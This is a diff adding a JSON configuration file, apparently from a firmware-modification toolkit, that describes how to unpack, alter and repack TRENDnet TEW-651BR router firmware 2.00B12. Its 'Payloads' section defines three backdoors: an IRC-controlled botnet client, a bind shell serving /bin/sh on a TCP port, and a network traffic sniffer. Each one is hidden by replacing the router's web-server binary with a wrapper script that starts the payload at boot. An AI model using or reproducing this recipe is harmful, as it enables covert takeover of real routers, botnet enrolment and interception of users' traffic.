@@ -1,0 +1,134 @@
+{
+  "Meta":{
+    "Targets":[
+      {
+        "Vendor":"TRENDnet",
+        "Model":"TEW-651BR v2.0R",
+        "Version":"2.00B12",
+        "Status":"Unverified"
+      },
+      {
+        "Vendor":"TRENDnet",
+        "Model":"TEW-651BR v2.1R",
+        "Version":"2.00B12",
+        "Status":"Unverified"
+      },
+      {
+        "Vendor":"TRENDnet",
+        "Model":"TEW-651BR v2.2R",
+        "Version":"2.00B12",
+        "Status":"Unverified"
+      }
+    ],
+    "Authors":[
+      "Michael Coppola"
+    ],
+    "Date":"March 21, 2012",
+    "Size":2510920,
+    "NeedsRoot":true,
+    "Filename":"TEW651BR_FW200B12.bin",
+    "Download":"http://downloads.trendnet.com/TEW-651BR_v2.2R/firmware/FW_TEW-651BR_v2.0R_v2.1R_v2.2R(2.00b12).zip",
+    "Checksum":"e2a85b06165b5b6afb4f8abdecd32ad9"
+  },
+  "OrderOfOperations":[
+    "ExtractParts",
+    "UnpackFS",
+    "_PAYLOAD_",
+    "BuildFS",
+    "PadFS",
+    "CheckFS",
+    "PackImage"
+  ],
+  "ExtractParts":{
+    "Description":"Extracting parts from firmware image",
+    "Steps":[
+      ["extract", "_FIRMWARE_IMG_", 0, 860178, "/headerkernel.bin"],
+      ["extract", "_FIRMWARE_IMG_", 860194, 1647140, "/filesystem.bin"],
+      ["extract", "_FIRMWARE_IMG_", 2510884, 36, "/footer.bin"]
+    ]
+  },
+  "UnpackFS":{
+    "Description":"Unpacking filesystem",
+    "Steps":[
+      ["unsquashfs-4.1", "/filesystem.bin", "/extracted_fs"]
+    ]
+  },
+  "BuildFS":{
+    "Description":"Building filesystem",
+    "Steps":[
+      ["mksquashfs-4.1-lzma", "/extracted_fs", 131072, "/newfs.bin"]
+    ]
+  },
+  "PadFS":{
+    "Description":"Padding filesystem with null bytes",
+    "Steps":[
+      ["pad", "/newfs.bin", 0, 1650688]
+    ]
+  },
+  "CheckFS":{
+    "Description":"Generating filesystem header+footer",
+    "Steps":[
+      ["cvimg", "/newfs.bin", "root", "000f0000", "00120000"]
+    ]
+  },
+  "PackImage":{
+    "Description":"Gluing parts together",
+    "Steps":[
+      ["touch", "_TARGET_IMG_"],
+      ["appendfile", "/headerkernel.bin", "_TARGET_IMG_"],
+      ["appendfile", "/newfs.bin", "_TARGET_IMG_"],
+      ["appendfile", "/footer.bin", "_TARGET_IMG_"]
+    ]
+  },
+  "Payloads":{
+    "botnet":{
+      "Description":"Remotely control device via IRC",
+      "Steps":[
+        ["cp", "payloads/botnet", "/extracted_fs/sbin/botnet"],
+        ["mv", "/extracted_fs/sbin/mini_httpd", "/extracted_fs/sbin/mini_httpd.bak"],
+        ["touch", "/extracted_fs/sbin/mini_httpd"],
+        ["appendtext", "#!/bin/sh\n", "/extracted_fs/sbin/mini_httpd"],
+        ["appendtext", "/sbin/botnet _IP_ _PORT_ \\_CHANNEL_ _PREFIX_ &\n", "/extracted_fs/sbin/mini_httpd"],
+        ["appendtext", "/sbin/mini_httpd.bak\n", "/extracted_fs/sbin/mini_httpd"],
+        ["chmod", "0777", "/extracted_fs/sbin/mini_httpd"]
+      ],
+      "Variables":{
+        "_IP_":"IP address of IRC server",
+        "_PORT_":"Port of IRC server",
+        "_CHANNEL_":"Channel to join (include #)",
+        "_PREFIX_":"Prefix of bot nick"
+      }
+    },
+    "bind":{
+      "Description":"Bind shell on TCP port",
+      "Steps":[
+        ["cp", "payloads/bind", "/extracted_fs/sbin/bind"],
+        ["mv", "/extracted_fs/sbin/mini_httpd", "/extracted_fs/sbin/mini_httpd.bak"],
+        ["touch", "/extracted_fs/sbin/mini_httpd"],
+        ["appendtext", "#!/bin/sh\n", "/extracted_fs/sbin/mini_httpd"],
+        ["appendtext", "/sbin/bind _PORT_ /bin/sh &\n", "/extracted_fs/sbin/mini_httpd"],
+        ["appendtext", "/sbin/mini_httpd.bak\n", "/extracted_fs/sbin/mini_httpd"],
+        ["chmod", "0777", "/extracted_fs/sbin/mini_httpd"]
+      ],
+      "Variables":{
+        "_PORT_":"Port to listen on"
+      }
+    },
+    "sniff":{
+      "Description":"Sniff traffic on the network",
+      "Steps":[
+        ["cp", "payloads/sniff", "/extracted_fs/sbin/sniff"],
+        ["mv", "/extracted_fs/sbin/mini_httpd", "/extracted_fs/sbin/mini_httpd.bak"],
+        ["touch", "/extracted_fs/sbin/mini_httpd"],
+        ["appendtext", "#!/bin/sh\n", "/extracted_fs/sbin/mini_httpd"],
+        ["appendtext", "/sbin/sniff _TARGET_ _LISTEN_ &\n", "/extracted_fs/sbin/mini_httpd"],
+        ["appendtext", "/sbin/mini_httpd.bak\n", "/extracted_fs/sbin/mini_httpd"],
+        ["chmod", "0777", "/extracted_fs/sbin/mini_httpd"]
+      ],
+      "Variables":{
+        "_TARGET_":"Sniff TCP traffic on port",
+        "_LISTEN_":"Port to listen on"
+      }
+    }
+  }
+}
